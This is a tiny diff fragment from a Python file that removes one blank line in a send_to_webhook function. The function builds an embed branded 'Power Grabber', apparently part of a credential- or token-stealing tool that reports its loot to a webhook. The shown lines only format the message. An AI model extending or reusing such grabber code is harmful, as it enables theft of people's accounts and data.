@@ -21,7 +21,6 @@ def send_to_webhook(content):
             "text": f"Power Grabber | Made by Powercascade and Taktikal.exe"
         }
     }
-
     payload = {
         "embeds": [embed]
     }
